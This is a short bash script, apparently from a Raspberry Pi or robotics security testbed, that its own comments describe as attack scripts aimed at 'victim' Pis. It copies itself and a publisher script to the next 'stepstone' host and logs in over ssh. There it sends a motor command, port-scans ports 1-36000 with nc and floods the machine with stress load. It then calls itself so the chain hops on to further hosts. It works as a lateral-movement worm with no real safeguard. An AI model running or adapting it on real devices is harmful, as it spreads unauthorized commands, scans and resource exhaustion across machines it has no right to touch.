#!/bin/bash
if [[ $# -eq 2 ]]; then
    echo "The last attacked Pi. Done!" > debug.txt
    echo "command:" $1 >> debug.txt
    exit 0
fi

arg_array=($@)
command=${arg_array[0]}
next_stepstone=${arg_array[1]}
next_motor_num=${arg_array[2]}
unset 'arg_array[1]'
unset 'arg_array[2]'
next_arg_array=${arg_array[@]}

# copy the attack scripts into the victim Pi
scp pi.sh publisher.py pi@$next_stepstone:/home/pi/Workspace

ssh pi@$next_stepstone > /dev/null 2>&1 << eeooff
    cd Workspace
    python3 publisher.py "$next_motor_num" "$command"
    nc -zvn $next_stepstone 1-36000
    stress --cpu 16 --io 4 --vm 2 --vm-bytes 128M --timeout 20s
    ./pi.sh $next_arg_array
    exit 0
eeooff

echo done!